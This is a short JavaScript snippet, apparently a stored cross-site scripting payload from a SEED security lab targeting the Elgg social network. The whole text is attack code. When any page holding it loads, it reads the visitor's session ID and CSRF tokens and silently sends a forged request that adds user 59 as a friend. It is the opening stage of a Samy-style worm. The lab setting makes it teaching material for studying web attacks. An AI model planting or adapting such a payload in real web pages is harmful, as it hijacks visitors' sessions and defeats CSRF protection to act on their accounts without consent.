<script type="text/javascript">
   window.onload = function() {
  
    var guid = elgg.session.user.guid;
    var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
    var token = '&__elgg_token='+elgg.security.token.__elgg_token;
  
    var sendurl = 'http://www.seed-server.com/action/friends/add?friend=59'+ts+token+ts+token;
  
    if(guid != 59) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open('GET', sendurl, true);
        Ajax.setRequestHeader('Host', 'www.seed-server.com');
        Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        Ajax.send();
    }
   }
</script>
